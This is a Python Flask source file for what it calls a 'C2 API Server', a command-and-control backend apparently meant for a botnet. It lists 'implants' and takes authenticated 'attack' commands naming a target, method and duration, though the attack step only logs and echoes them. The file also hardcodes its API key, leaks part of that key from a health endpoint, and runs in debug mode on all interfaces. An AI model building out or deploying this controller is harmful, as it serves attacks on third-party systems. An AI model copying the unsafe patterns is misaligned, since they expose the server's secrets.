from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

API_KEY = "sk-bd-aditya-Hiro7060-2024-X9Z7Q2W5K8P3M6N9V1B4"

@app.route('/')
def home():
    return jsonify({"message": "C2 API Server Live!", "status": "OK"})

@app.route('/api/health')
def health():
    return jsonify({
        "status": "healthy", 
        "api_key": request.args.get('key', API_KEY)[:10]+"...",
        "url": "https://api-server.railway.app"
    })

@app.route('/api/implants')
def implants():
    key = request.args.get('key', '')
    if key != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify([
        {"id": 1, "name": "windows-bot", "ip": "192.168.1.100", "status": "online"},
        {"id": 2, "name": "linux-bot", "ip": "192.168.1.101", "status": "online"}
    ])

@app.route('/api/command', methods=['POST'])
def command():
    auth = request.headers.get('Authorization', '')
    if auth != f'Bearer {API_KEY}':
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    print(f"🚀 Attack Command: {data}")
    
    # Log attack
    target = data.get('target', 'unknown')
    method = data.get('method', 'unknown')
    duration = data.get('duration', 0)
    
    return jsonify({
        "success": True,
        "message": f"Attack launched: {target} {method} {duration}s",
        "timestamp": "2024-04-23T12:00:00Z"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
